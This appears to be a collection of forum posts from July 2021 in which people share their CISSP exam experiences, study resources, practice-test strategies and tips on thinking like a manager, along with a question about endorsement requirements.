This was by far the weirdest exam I have ever taken. At no time, did I know or feel if I was doing well or not. The questions are worded in a way that many answers could be correct ones and I feel that this is what makes the test **'difficult'** for some. There were a lot of test-taking skills that I applied like the process of elimination and re-reading the question again to ensure I was understanding the question correctly. At the end of the day, I believe my experience and knowledge of infosec acquired over the years is what got me the pass.

&#x200B;

I just want to say you definitely don't want to memorize anything. The cramming session I did overnight was focused on a couple of areas I didn't feel comfortable with and I really just tried learning the concepts. Memorizing will definitely not help you in this test. Definitely need to understand concepts and take the test from the perspective of a 'Risk Consultant'. That really helped me.

&#x200B;

Anyways, I'm happy that I was able to pass and I'm also very thankful for the posts with resources people used to pass the exam that I was able to review the past month. I did use some. 

&#x200B;

Here's my list of resources that I used this week:

\- Eric Conrad's 11th Hour **( Read book overnight and today before exam, its a super quick read and very helpful)**

\- Sybex Official Study Guide **( reviewed only concepts I didn't understand quickly)**

1907,oswpx3,CISSP endorsement questions,"I'm currently studying for my CISSP and have some questions about who can actually endorse me.

I thought I just needed to prove 5 years of experience in the domains covered, I didn't realize that the person endorsing me has to also be ISC certified.

I am part of a two man IT team and would've had my boss endorse me. the scope of my job very much includes security.

However, while I have 5 years of security experience, my boss is not an ISC member. I'm also not particularly looking to jump ship once I'm certified (though id make a lot more money if I did.) How do I get my skills endorsed when I pass the CISSP exam?

Can my boss endorse me without a CISSP himself?

Can I be endorsed by a third party ISC2 member? If so, what will I need to show them to prove my experience?

For example, in the past five years I have:

- earned a CRTP certification

- built and tuned a SIEM solution based on graylog, elasticbeats, sysmon, and graylog sidecar. This system uses SIEM rules translated from the sigma project (to which I am a github contributor)

- developed the incident response plans and playbooks for our organization (a few hundred pages worth)

- planned and implemented CCTV and access control systems for all of our sites...

- ... along with matching surveillance and privacy policies specific to our region (were a govt agency subject to strict privacy laws)

- top 500 member of hackthebox.eu since 2017

- set up and perform monthly vulnerability assessments

- replaced all our firewalls and audited their rules and configurations

- wrote the RFPs for several new projects (including disaster recovery)

- been the primary responder to several ransomware incidents (at my previous job at an MSP)

- Developed security awareness programs for our staff (both knowbe4 and live demos such as demonstrating USB HID attacks to staff)

- formally specialized in infosec during my computer science degree

- write infosec articles in my spare time, several of which have been cited by large organizations including infosecinstitute (not that i like infosecinstitute, but whatever)",2021-07-27

1913,orz3bf,5 Tips For Passing The CISSP Exam,"Thought I’d share some of my top tips for passing the CISSP exam.

**#5 Read and Relate**

“I don’t understand, I read the Shon Harris book 3 times! How did I fail the exam?”

You read The Odyssey.

You read The Old Man and The Sea.

You read To Kill A Mockingbird.

You don’t read a CISSP study guide.  You must relate and understand a CISSP study guide.

Software Development Security was my weakest domain.  I’d turn my computer speakers up, and listen to a 2-hour video about Software Development Security on YouTube or CBT Nuggets.  Then, I’d proceed to forget everything in three days.  I don’t create software for a living, which is why I had a tough time relating the Software Development Life Cycle (SDLC) to the real world.

But I did work in network security for a living.  A job in which I applied cryptography concepts into action through the use of VPNs and SSH every single day.  This is why cryptography became my strongest domain, I had the ability to relate what I read in CISSP study guides.  I’d read about symmetric and asymmetric encryption, and then apply it for customer devices and environments.  It was awesome.

In an effort to increase my knowledge about the SDLC though, I Googled and YouTubed all I could.  I’d Google things like “iphone software development process”, or “SDLC process used by Facebook”.  I’d read about these real world examples to better relate it to the CISSP books.

I found out too late that the CISSP is actually not a memorization test, it’s a test of concepts.  Keep that in mind as you study!

**#4 Obsess**

“I tried to make the game perfection” – Michael Jordan

How do you get good at something? You have to keep doing it over and over again.  If you want to be a good basketball player, you gotta put in hours shooting in the gym, learning how to dribble tighter, run faster, and shoot more accurately.  Michael Jordan obsessed over the game, and went on to become a basketball legend, and accumulate an estimated net worth of $1 BILLION!

Michael Jordan was the totality of all his training.

I remember obsessing so much over the CISSP that sometimes I neglected my friends, family, and general hygiene.  When obsessing, it’s hard to let go.   While driving, going to sleep, or eating, my obsessive subconscious would still think of a problem, and continue to work on it.

Obsession can be dangerous mentally, but with proper control, it can be an effective productivity tool.

Luckily, you can start the obsession phase 2 months before you take the actual exam.  This is the time to sleep, breathe, and eat CISSP.  Just study it everyday right up until the exam so everything stays fresh in your brain.

**#3 Write**

Not type. Not email.  Not text.

Write.

Pencil and paper.

Read about vulnerability testing, and then draw out a network topology map and place the firewalls, IPS, IDS, and servers where they should belong.

Read about system ring architecture, and actually sketch the proper and secure path for a system process.

Read about the OSI Model and actually draw out how a packet starts at the application layer on Host A, and travels up the layer to Host B.

Let the information you read, flow from your brain, through your arms, and to the tip of your pencil.  When you get a question about a packet having issues at the network layer on the exam, your brain will recall back to your hand motion of writing about it on a piece of paper.

**#2 Trust Yourself**

Before actually taking the exam, all I heard was that the CISSP was an incredibly tough exam.  This was in the days of the 250 questions and 6 hours of total mess-with-your-mind torture exam.

This is true.  But I’m here to tell you that it is a completely passable exam! It’s not that difficult.  The only way to do it is to follow the same formula as everyone else who has passed.  Get some real life security experience, study the Shon Harris books, take an ungodly amount of practice exam questions, and mentally prepare yourself to sit in an exam room for a prolonged period of time while being mentally tested.

After completing about 180 questions during the exam, I actually started to feel fairly confident that I will pass.  Before taking the exam, I felt 60% confident that I’d pass, even though I studied for 10 months.  It is only after passing, that I realized I should’ve trusted myself 100%.

I’m trying to boost your confidence now, and not after the exam.  If you study well, you will be a CISSP.  It is not that difficult.

If you understand the concepts, and can truly see the big picture as it relates to information security, and have done your best to study for the exam, then trust yourself.  You will pass.

**#1 Don’t Give Up**

The alarm rings at 8:00 a.m., but it’s your day off.

You came home from a tough week of work, spent time with your family trying to hide your exhaustion, then finally collapsing into bed.

You deserve some rest.

Then your brains reminds you about that alarm you set early in the morning.  You still have an exam to take in 5 weeks.  You may have failed it the first time, but you’re definitely not going to fail it the second time.  You still have to read more about Common Criteria and Spanning Tree Protocol.  You still need to nail down all the steps in a forensic investigation process.

I can tell you not to give up a million times.  I can tell you that dedicating yourself to study for the CISSP is the only way to pass the first time, but it’s ultimately your decision.

Don’t give up.",2021-07-26

I wasn’t in a security-focused role in the job I’ve held for the last 16 years, and keeping up the CEUs wasn’t worth it. That being said, the CBK and the exam - as well as the industry in general - are radically different than they were then and I’ve never been in a “traditional” security role. My earlier test was the 6 hour paper exam on 10 domains that had very little overlap unlike the current 8. 

Prep: 1 month, OSG 8th edition, sample test companion book, ITPro.tv subscription (accelerated 2018 version, 2021 came out just before my test), mind map and exam cram YouTube series. I also credit Harry Lorayne and Josh Foer for the memory techniques that I made extensive use of in my studies.

If I had to prep over again I would’ve done the mind map series first before starting ITProTV and OSG. It would’ve given me a better 360 and a place to hang the specific concepts as I picked up more detail.

The adaptive testing is no joke. I honestly had no idea how well I was doing, or whether I was going to pass or fail when I got my results. I had no idea which questions were evaluated, and TBH was often not sure whether I knew the answer or not. I would have probably dreaded my results and felt like giving up if I hadn’t seen [this video](https://youtu.be/5nqqL1rjIY4). If you’re used to acing paper exams this will feel awful.

I don't want to be memorizing answers to mock exam questions.  My goal is to pass successfully by the end of the year and my time is very valuable.  

I'm finishing the Sybex book, I've underlined various terms and content that I think is important.  

I was going to do Cornell Notes and Mind Maps of what I think is important.  Was also going to watch Linkedin Learning content related to CISSP.

When do I start do the mock exam questions.

I couldn't be happier, I've prepped for almost 2 years.

&#x200B;

Top advice, spend as much time as you can in the [Certification Station](https://discord.gg/certstation) Discord channel. There you will find both what's the proper material, and relevant and authoritative discussions about the different topics.

I've compiled which sources I used in this [LinkedIn post](https://www.linkedin.com/posts/lucianovaschetti_today-i-defeated-the-beast-after-100-activity-6823330484798423040-ox-X)

&#x200B;

Although it's a Manager exam, it evaluates technical content, so you have to be comfortable with the vocabulary and how the technology works. That said, technology is not the most important to be evaluated.

As I've been told, there are really weird questions (although related, of course)

New topics come up, but being aware of them and knowing the inch deep is enough.

It's not worth memorizing anything (and I didn't), but understanding and being able to talk about the major processes (BCP, BIA, DRP, IR, SDLC)

Time wasn't an issue with the exam. On the contrary, 100 minutes were left, even without rushing into any question. Taking a few breaks to go to the bathroom and drinking water was really helpful.

The last days I relaxed and took walks while listening to Rob Witcher's mindmaps, and listening to different mindset videos on Youtube (Kelly, Larry, Seth Misenar / Eric Conrad)

&#x200B;

These videos helped me a lot, to be in the ""Think like a Manager"" mindset, I watched them several times:

[https://www.youtube.com/watch?v=v2Y6Zog8h2A](https://www.youtube.com/watch?v=v2Y6Zog8h2A)

[https://www.youtube.com/watch?v=HWg2geVJuvs](https://www.youtube.com/watch?v=HWg2geVJuvs)

[https://www.youtube.com/watch?v=dq5eodSz\_0k](https://www.youtube.com/watch?v=dq5eodSz_0k)

&#x200B;

Something really helpful was to print the Exam Essentials from OSG 9, and reviewed them all, marking and putting comments to anything I wasn't sure about.

So, covering 100% of the topics (without memorizing anything like cable speeds) + a good mindset = being comfortable at the exam room.

Also, before entering the exam room, I took 5 minutes for myself and breathed with my eyes closed, listening to this one: [https://www.youtube.com/watch?v=AtF0T2fPvbI](https://www.youtube.com/watch?v=AtF0T2fPvbI)

&#x200B;

As for the questions in the exam:

\- Some of them were really direct /easy/straightforward (e.g. ""what's best for accomplishing ***this***). These ones would be like Boson.

\- Some of them were hard, in the sense that the purpose was hidden (they used other words different than the ones we're used to (e.g: Privacy instead of Confidentiality). These ones would be like Thor's

\- Some of them were really weird (assume most of that ones were non-graded) and I'd tried my best. These ones would be like Wentz's

I think there were 1/3 of each of those groups. Really, some of them weren't that hard

But.. for the first group, I had a (simple) networking question, or access control model questions, that if I didn't know the knowledge couldn't have answered.

1924,opmbh7,"Provisionally Passed 100 Questions, 2 Hours","It seems customary to post a pass here, and since others' success stories have inspired mine, thought I would give my 2 cents as well.

I would consider myself one of the less experienced coming into the exam, am currently a post-graduate student finishing up Masters in 4 months, and zero work experience outside of an internship. 

Started 4 weeks ago using the following:

**Study Materials**

* [Sunflower CISSP Summary](https://docs.wixstatic.com/ugd/dc6afa_fc8dba86e57a4f3cb9aaf66aff6f9d22.pdf) by Maarten de Frankrijker
* CISSP Exam Cram by [Inside Cloud and Security](https://www.youtube.com/channel/UCAr0yk0um7lwLjmrKfzwyig)
* [Destination Certification](https://www.youtube.com/channel/UCXk6whiDrWq42y9Tdv1MEhg) summary videos
* Google

CISSP Exam Cram came first, and after finishing all 8 domains and doing a few questions, I watched Destination Certification videos as a refresher. Sunflower CISSP Summary was mostly used as reference material, alongside Google.

**Practice**

* CISSPrep

Comparing the style, CISSPrep questions were very similar to the questions I got during the certification tests. Its pretty affordable as well. Some questions there are worded poorly, or have bugged options (especially for the drag and drop, somehow it doesn't record your selections properly), and some questions that I got wrong were not very well explained by them. However, it did a proper job in training me to focus on what's important when reading and answering questions (think like a manager).

I would say that results for practice tests don't really matter (unless you're getting below 40-50%), what's important is what you get from it. I was scoring 60-65% on the CISSPrep mock exams the day before the test.

**Pre-Test/Pre-Practice**

*  [CISSP Testing Tips Secrets All Students Should Know](https://www.youtube.com/watch?v=CanT50bzEV0) by Andrew Ramdayal
*  [Why you will pass the CISSP](https://www.youtube.com/watch?v=v2Y6Zog8h2A) by Kelly Handerhan

Having little work experience, these 2 videos were vital in getting me into the correct mindset when doing practice questions, and sitting for the test. Watch them once before doing practice tests, and as many times as you want before you sit for the test, I feel it really helps.

**The Test**

It wasn't as hard as I expected it to be. Questions were pretty clear in explaining scenarios, just make sure to read carefully and read all the options. Many times I changed my answer at the last minute after realizing I read the question/options wrong or too quickly.

It was a wild 4 weeks for me with many lows, and not many highs, and I wish whoever who is preparing for their upcoming test all the best. Make sure to get enough rest the day before, and eat well (but not too well) to last the entire duration of the test.",2021-07-22
1925,opked7,CISSP Experience,"This forum helped me quite a bit and hence thought to update my experience for the benefit of the community and offer credit to the immense learning resources on the web

About me: Over 10 years in IT / Risk / Cyber.  

**Prep:** About 3 months, initially about 1 hour / day followed by 3-5 hours of revision in the last 2 weeks.

The following resources help strengthen my concepts (A big thanks to all of them):

· Thor Teaches

· Kelly videos

· Official study guide and practice questions

· CISSP mind maps on YouTube ([https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s](https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s))

· Reddit and ISC forum

· Reviewed the ISC practice questions once but did not attempt any more practice exams since I ran out of time. 

**Exam experience:**

Like most of the commentators before me mentioned, the questions were not straight forward, and I had no clue if the answer was correct. In fact, I tried looking up the answers to some of the questions I recalled at home but struggled even with Google! Some domains had more questions than others. I planned to take a break after 100 questions, but the exam ended on the 100th question with 1hour to spare. I did not look at my transcript until I was out of the centre  and was pleased to have provisionally passed. 

**Top Tips:**

Read the question and identity key words such as “Which solution”, “What comes first” etc. This should help filter out some of the answers. 

There is a lot of material out there and found additional value in each of them. Since the scope of CISSP is huge you will need to refer multiple sources.

If I had to prepare again, I would try to cover as many topics as possible and answer the following question with 1-line answers. What, Why and How. I don’t think it is necessary to go in depth and unnecessary details. Focus on concepts and understand why some of the technologies actually exist, their vulnerabilities and remediation. Use practice tests to re-in force these concepts and not as a barometer of your performance in the exam.   

Hope this helps :)",2021-07-22
1926,oph7oz,How do you complete your continuing ed credits?,"I am a fairly new CISSP and I am starting my continuing education credits now. So far I have done some express learning on the ISC2 website as well as some BrightTalk videos.

1927,opgpgp,"Passed CISSP, 100 Q, <1 hour","I (provisionally) passed my CISSP exam, 100 questions, under an hour (I believe 51 minutes?) and I *significantly* over prepared. I don't say this as bragging, but as a touch-point so others might have a guide of ""what's enough"" and ""what's *too* much."" Also looking back on my journey is through the lens of what I know now, I might be overly critical of some resources. *To that end* I may be over-critical of some resources as not being helpful, but as it's difficult to divorce my viewpoints from my perspective to that end, I'll just give you as honest-as-possible evaluation of what I used.

My main takeaway is: The most productive parts of my journey were a tight feedback loop of practice exams, identifying weak points, studying, and repeat. 

# Before CISSP

I have \~9 years of IT/technical experience, 4+ of which was a wide-spread role containing cybersecurity, IR, limited forensics, DLP, and security tool administration. The last 9-10 months have been as a Cloud Security Architect. All of this has been at the same organization, a Fortune 100 enterprise.

Previously I've obtained the following certifications that the studying of helped (at least in part) for the CISSP:

* Security+
* SANS GCIH
* CEH (Masters)
* Cloud+
* AWS Certified Cloud Practitioner
* AZ-900
* AZ-104

In addition I took the OSCP class, and worked some of the labs, but did not attempt the exam. Retaking the class and reattempting the exam is a 2022 or 2023 goal for me.

# Studying for the CISSP

I began with the 11th hour. I guess it was nice, but it felt way too high level. I know a lot of people say this is a great last-minute prep, but I really can't agree with that. It was so high level and detail-lacking I can't really see the value. I guess it was a nice first pass? In hindsight, the [CISSP Mindmap video](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) series would have been a much better first pass. Note, I didn't study the 11th hour, just read through it once.

I also listened through, twice (just because it was long-car-trip material) the [Essential CISSP by Phil Martin, Second Edition](https://www.amazon.com/Essential-CISSP-Exam-Guide-Knowledge/dp/B07JDJV47Z). I thought it did a decent job, and if you would like to study during car trips, it's the best audio book I found. I tried some others, but I wouldn't recommend them.

Next I went through a period of practice exam, official study guide, rinse, repeat. The first practice exam I took was the OSG's companion exam, then my three worst chapters in the OSG, then BOSON A, then the half-dozen worst chapters in the OSG (which did see some overlap), then BOSON B, the worst 3 chapters *and* the OSG's domain exams over the three worse domains, then BOSON C. I made notes along the way and reviewed the notes. I did all BOSON exams in ""study mode"" and if I missed the question I would screenshot the relevant parts of the explanation and added it to my study material. For the OSG practice exams, I would review the missed questions and also produce notes from them. All of my notes I went over at least twice, sometimes as many as six times. This being said by the time I had finished this, half of the OSG hadn't been touched, and I did not exhaust either the OSG practice exams (or close to it) or the BOSON exams. However the exams were different, so I would recommend both.

As a small aside, all of my study material was for the previous version of the CISSP. I did not feel like this left me ill prepared for the new version to any extent whatsoever.

Another small aside, I did watch a hodgepodge of videos on YouTube to focus in on any topic I felt uncomfortable with. My total time watching such videos was <6 hours, including repeating videos.

I also watched ""[Why you WILL pass the CISSP](https://youtu.be/-99b1YUFx0A)"" and read through [How To Think Like a Manager](https://www.amazon.com/Think-Like-Manager-CISSP-Exam/dp/1735085197/ref=sr_1_3?dchild=1&keywords=Think+like+a+manager&qid=1626967662&sr=8-3) during the weekend before my exam. I think they were both important, and added value. *However* I feel like the mindsets pushed in these study materials--*while valuable in the real world*\--weren't as important to the CISSP as they made it out to be. Still, do yourself a service and go through both of them.

Near the end of my preparations, I noticed I would read a practice question, and be able to *sometimes* articulate why two different answers were correct. Not in a ""these are both good answers, but I need to pick the best of the two,"" sort of way, but as a critique of the question author sort of way; I could display a deeper understanding that showed I understood the question; I was able to articulate an important security or business consideration that made it easy to justify multiple answers without more information. Thankfully on the actual exam I only came across one quesiton where I felt like I needed more information.

This level of understanding was probably the best sign I had that I was ready for the CISSP.

I was willing to accept if I picked a wrong answer in BOSON, the OSG exams, or Think Like a Manager, but about 1/3 - 1/5 of the time when I got a wrong answer I felt like I had a valid critique of the question, I would count myself as having gotten that question right. To that end, I was scoring about 85% on my last BOSON exam (first time taking the exam, I never repeated BOSON exams) and \~75% on my OSG ""trouble domains"" (domains where I was needing the most studying).

Lastly I will say please avoid the ""Inside Cloud and Security"" CISSP exam cram. I really hate saying this since his videos are engaging, clear, and generally well explained, however they suffer in three key ways. First what he decides to talk about feels like a patchwork of topics within the domain--or at least that's my view after having studied the domains--rather than a complete picture. Second, he often skips pass topics with a quick definition that really aren't valuable to you during the exam without actually understanding the topic, so it might give a false sense of readiness. Third, and most importantly, some things he says are outright wrong, which is dangerous for the exam. It felt like he got things that were more academic and less practical wrong, which makes sense given that he admits he did very little studying and depended on his extensive industry experience. 

# Final Thoughts/Summary

So the biggest reason I typed all of this up is to provide some context as to how to slam dunk the exam, and when you probably will slam dunk the exam. It also seems people are very hesitant in saying what % of practice exams will see that you pass, so here's my guide:

You're certainly ready to take the exam:

* When you're getting 80%+ on BOSON *from understanding the questions and not rote memorization.*
* When you're getting 75%+ on the OSG comprehensive exams *from understanding the questions and not rote memorization.*
* When you're getting 70%+ on the OSG domain-specific exams for your weakest trouble areas *from understanding the questions and not rote memorization.*
* After you go through the provided ""Think Like a Manager"" materials
* You have gone through all of the questions you missed, understand why you missed them, and spent time understanding accompanying material (if you miss a question about why a certain encryption technology is a bad choice in a specific situation, and another is a good choice, study both technologies in a broader sense, and loop in a third, forth, etc, technology that might be comparable)

This was where I was at, and, again, I was more than ready for the exam. Actually during the exam do basic good test taking skills such as ""carefully read the question, make sure you understand it, eliminate two answers,"" etc.

Also I will say the OSG exam *and* BOSON had questions that were grossly in the weeds such as ""you need to network two devices over X distance and you need Y speed. What Ethernet cable would you need?"" or ""A user is currently using 802.11(whatever). They want to upgrade to X speed. What 802.11 technology would your recommend?"" 

Do NOT worry about memorizing any tables of raw numbers like these. I saw NOTHING on the exam that was that in-the-weeds. Plenty of technical or semi-technical questions, but no rote memorization of numbers. In real life this is something you can certainly look up, or you deal with so regularly that you'll learn it as a matter of course.

I'd be happy to answer any questions that I can that respect the CISSP NDA.",2021-07-22
1928,ooy5bj,My CISSP journey from zero to passing with some obstacles," **My CISSP journey:**

I started studying at the beginning of 2019, inspired by some posts on reddit and the fact that the content of CISSP is very interesting for me and my further career steps. I spent about 3 months reading the Official Study Guide (OSG), researching a lot of content and taking lots of notes, and in the meantime, I was very confident that I would pass the exam.

However, in the middle of 2019, I stopped studying because I got an interesting job offer in security that required a bit more attention. So I decided to take a break and catch up on the OSG sections from time to time. 

In early 2020, I met a work colleague who has already passed the CISSP exam, he gave me some tips on good sources to continue with my studies. Later I will give a brief overview of the sources that helped me. I started studying seriously for a second time. This time with Thor and Kelly while I was driving. In the evenings I read the OSG and the latest Sunflower PDF to have a lot of information in a condensed form. Later in the year I ordered the Boson question bank and the OSG practice exam to practice some questions. In the beginning, I regularly scored 75% and reread my weak topics.

I booked my first exam in Germany, Düsseldorf for December 2020, due to Corona the test center was closed. The next possible date for the exam was in February 2021, this date was also cancelled. The next test date was then in April 2021. If I didn't pass the exam on that date or the test was cancelled again, then I would have to learn the new content because of the content update in 2021. And it happened again, the exam was cancelled again. Now it was clear I had to understand and be able to apply the new content, by 11 July. 

The last weeks before the exam I studied after work in the evenings for about 3+ hours, plus all the weekends. The day before the exam I thought I was ready to take it, but as soon as I saw the first 10 questions, I thought what the hell, I never read about this content. Halfway through, I wasn't very confident that I could pass the exam, but I focused on each question. When I finished the last question, I went to the reception and got my result - **Congratulations!** 

I passed, the CISSP exam.

**The study resources I used to prepare:**

**Cybrary Kelly Henderson:** I like her video training, she is very funny, knowledgeable and a great educator. You get a good and deep overview in her videos, which is easy to understand even as a non-native speaker. A must watch is her video on YouTube ""Why you will pass the CISSP"". 

**Thor Theache's CISSP:** I have seen a few write-ups saying that his content is not very good. But I disagree, his content is a bit expensive but worth watching. He is also a good trainer and sometimes he is available in the discord channel of certification station.

**CISSP for dummies:** I ordered this book and never read a complete chapter. Sometimes I had to re-read some content to get a second or third view of the content. 

**(ISC)2 Official Study Guide - latest version in 2020:** my main study resource, I read this book cover to cover, word for word. It is a good resource to get a good overview of the content, which is really a mile wide and a inch deep. At times I thought it was 1.61 km wide and 2.54 cm deep 😉. But if you ask me if you can pass with just the OSG, I will say, yes, it is possible, but you should take some time to read some other books as well.

**Eleventh Hour CISSP:** I got this book to get a quick overview of all the content that might be necessary in the last week. In hindsight, I would have read this first before going through the official study guide. It gives a good overview of everything to expect in the exam.

**(ISC)2 Official Practice Exam:** You should use the online version of the book, this is more helpful than the paperback. You will need to use the code you get from the paperback to register for the online test bank.

**Boson CISSP Practice Exam:** A lot of questions for a good price, updated regularly. You will need Windows to work with Boson. The questions are very technical and the answers are very well explained so you understand why the questions are wrong. This is a ready important aspect from my point of view.

**Certification Station Discord:** The CISSP channel is absolutely worthwhile. A very good resource that I would recommend anyone to join. Ultimate bunch of helpful people, open 24/7 (because of the international audience). Discussions on various topics have helped me a lot

**Destination Certification Flash Cards:** If you are on a train ride, journey or similar, take these flash cards and just read them one by one. Very helpful in my eyes. I would read them in the middle of my exam preparation.

**Do's and Don'ts:**

\- Register as soon as possible. The examination center in Germany, Düsseldorf is always fully booked at short notice.

\- I have done 4000+ questions.

\- Read correct AND incorrect answers of the question

\- Read the question twice during the exam

\- Do not give up during the exam, even if it looks bad

\- Be a member of a study group (Certification Station)

\- Eat well and do some exercises to have a fresh mind.

My last words, ""Don't talk the talk, walk the walk"" and all the best. I will now rest for a few weeks and then continue with CISA or CISM.",2021-07-21

2021Going into the exam I was much more well prepared, but I knew I had weaknesses. I felt like I could pass anyways.

April-May

Took CISSP SANS Course with David Miller. Loved the course, but wasn't crazy about Miller. There were something he said, that he was so confident in, that I found that were either wrong, or poorly said. He also talked really fast without a quick break. I imagine this might be because of online teaching, but maybe go with one of the course creators. For example, we got hung up on the terminology On-premise, on-prem or on-premises and what the exam would use.

Not to drive into it, but that isn't important, lets discuss the topics, not that on-premise is not correct terminology when talking to IT personel, and at the end of the day, no one cares. However, David Miller was really good diving into the technical points and bringing it all together. If you don't mind some of the small banter, and fast speaking, then go this route.

I would recommend the course, but be weary, everyone is different, and I really believe teachers should be suited to the student.

&#x200B;

SANS then provided Audio w/ Eric Conrad. I used this whenever I could.  A lot of story telling, but when it would drive into the points it was good.

I used Eric Conrads books, which were great. Really helped me drive some points.

Coffee shot videos 9/10, they really put things together for me, on how to answer and review CISSP questions

Luke Ahmeds book 10/10 was the BIGGEST help after the full study.

**Cisspprep** 100% need this, you'll get mad at yourself but do it. Thank me later  
**Sybex Wiley** Do this about 6-4 weeks prior to your test. Then a few weeks before do ALL the questions you got wrong, study those topics that you keep getting wrong

1934,oonpos,Passed yesterday with 100 questions,"So glade to have this done. Been in IT for a while and never got any certs. In the year, I got A+, Net+, Sec+ and now CISSP, which is way harder than any of the others. I took this exam back in May and failed the first time. So, after this I change my study method, which was just go through the Official guide a few times. 

Although I don't like bootcamps, I did attend one by Technical Institute of America, with Andrew Ramdayal. He is a very good instructor and I used his udemy to pass the sec+ a few months ago. His course really helped me understand the mindset of the question and topics. I then got the new official guide that came out last month made tons of notes. I only used CCCure questions and the the ones from the study guide. 

I think what made the difference is the way you approach the questions. Coming from sec+, you are more direct and this exam is not. Sec+ was always 1 correct choice, this exam some of them had what I taught is 4 correct choice. Andrew Ramdayal, larry greenblatt, and Kelly has the tips you need to pass the exam on youtube. Check them out. Trust me when I say this exam is more of how to select the correct answer than it is about knowing your stuff.  

You guys can can pass easily if you apply the right mindset. DO NOT go into the testing room without the right mindset or you will fail. This exam is very different than any of the 3 comptia certs I did. Thanks to everyone in this sub to help point me in the right direction after failing and losing $700.",2021-07-21

1937,ooeqh5,CISSP Is Overhyped,"Context: I'm 18 and a senior in a Cybersecurity Engineering program

Did 25 practice problems last night and went in with an hour of sleep into the exam (Couldn't put down the video games lol). Exam ended at 120/150 question and I passed.

I felt offended at how easy it was. In my opinion, it was much easier than even Security+. And we all know how much of a joke Sec+ is.

If someone can study for the CISSP while taking 16 credits over the summer and playing Genshin Impact for 6 hours a day then I'm sorry but the exam has lost its credibility.

I will try for OSCP after the summer semester ends and hopefully it doesn't end like CISSP.

EDIT: If anyone here is into hackthebox, drop me a dm. The highest I've ever gotten is top 500 globally but after that I hit a brick wall. Drop some advice/resources in my dms if you have them.",2021-07-21
1938,oo5siy,Today was the day......,"Today was the day that I skipped like a schoolgirl, air punching, and yelling around a parking lot for 10 minutes…. Yes, it happened. Okay, what you’re here for.

After a little over 2 hours (I think), I have concurred this thing… I have roughly 9 years of experience in the field, with various certifications (CASP+, SEC+, A+, and CCNA). I am also pursing an MS-Info Science – Info Assurance.

Length of preparation for me was two months and some change… I chose to utilize my summer break from Grad school to prepare for this exam… and it worked out! Not itemizing hours, or questions, or pages, or any ""quantifiable things"" as everyone is different, and everyone takes in information at different speeds.... but here's what I have for you!

My piece(s) of advice:

1. Why do you want this thing? It’s not a “fun” process…. If you do not have a solid reason to dedicate yourself for however long you identify you need to prepare… it might not happen… I’ve creeped this thread, messaged many, and it’s happened, yes…however the odds are not likely. Know why you want to be a CISSP, and let that drive you to studying and preparing to test!
2. Mentally prepare yourself to sit there for 150 questions, when my test went past 100… I immediately got down on myself based off peoples comments of the 100q pass…. This took me a minute to take a deep breath, and get back into it… so just prepare yourself mentally you’re in it for the long haul! After all, a pass is a pass…..
3. Full dedication to the process. As mentioned I chose to use my summer break for this certification. My commute to work was not filled with music, it was filled with downloaded videos (mentioned below), via YouTube premium (FREE for one month, do this!) every single day for the duration of my preparation. My evenings were not filled with having beers with buddies, or watching movies with the wife and dogs…. It was spent in our office, reading, watching, listening, writing….. This thing is its own beast, and requires your mental and physical dedication…. Know that before you start this process!
4. Relax, breath, think…. That’s what my scratch pad said…. When I hit a question that went from an easier type question, to a short story…. I had to remind myself to relax, breath…. Which allows you to think.
5. Do not be afraid to fail. This is one thing I told myself starting this process, no matter what happens, I am bettering myself for doing this… I was not afraid to fail, what I was afraid of was of having to continue to study and retake this thing….wasting what I have left of my summer break… so don’t be afraid! After all, it’s a process, and participating in this process you will be shocked at how much you learn and grow!

Resources (what people seem to care about the most):

* Sybex OSG (8th Ed.):

\-Primary resource of reference/clarification for the entire process.

\-First pass, “read” cover to cover… took end of chapter tests, moved onto next chapter.

\-Emphasizing the “read” portion, as I did not read it word for word as some did….. Chapters I felt more comfortable with the material, I skim read and picked points within each chapter I had no idea what is was, and fully read that section.

\-Second pass, read the sections I scored lower than 75% on the end of chapter tests from start to finish, retook the tests.

* Sybex OSG Practice Tests (8th Ed.): Register your book online! Much easier and more convenient as you can access the tests with your phone, or tablet…. I DID NOT take all of these tests, as mentioned I did each chapter test in the manner above. For each practice test, the matter at which I took them, took each Domain test once, pending the score (e.g. below 75-80%) I would go back and review that domain, and then retake the questions I got wrong… to alleviate from memorizing answers.
* 11th Hour CISSP: After I read the massive Sybex OSG I needed more “light reading.” I read this book front to back, easy read…. Very high level overview of the topics. So stepping your mindset back a bit from the OSG source.

Videos:

* CybraryIT -  [Free Cybersecurity Training and Career Development | Cybrary](https://www.cybrary.it/) (free access if you only access a certain number of sources, not do check whatever I did about a ""premium offer""..they'll never stop calling you until you tell them to leave you the heck alone) – Kelly H’s videos… these were a great change of pacing getting out of a book, and questions. I DID NOT watch all of these….I watched her videos on topics I needed clarified, or explained in another way from my reading.
* Destination Certification Mindmaps -  [CISSP MindMaps / Domain Review - YouTube](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) : Wow, yes, I watched all of these…. And some of them multiple times for topics I just wasn’t grabbing onto….. 10/10 recommend this to help tie words together that may help you on the exam.
* Inside Cloud and Security -  [CISSP Exam Cram - YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) : Again, yes, I watched all of these…… And some of them multiple times (probably each of them at least twice). I used his 2021 topics videos to supplement the OSG version I used not having the most recent topics.
* Prabh Nair’s CISSP videos, and Coffee Shots -  [Prabh Nair - YouTube](https://www.youtube.com/channel/UCfZMpaSGpTa4JoqoZHCJBcw) : I incorporated these my final two weeks of study (by the point you’re either getting it or you’re not)… his videos were great! I also used his 2021 topics videos to supplement the OSG version I used not having the most recent topics. Tip for his videos, put the speed on .75x… he speaks rather quickly…. This helped my tremendously.
* Andrew Ramdayal CISSP videos -  [CISSP - YouTube](https://www.youtube.com/playlist?list=PLdC3YQR4lNFLHJh_lOd2QMovHjhEdTFjN) : I watched all of his videos once, particular one that stood out to me was his “Testing Tips” and “Practice Question” videos.

Questions:

* OSG Practice tests
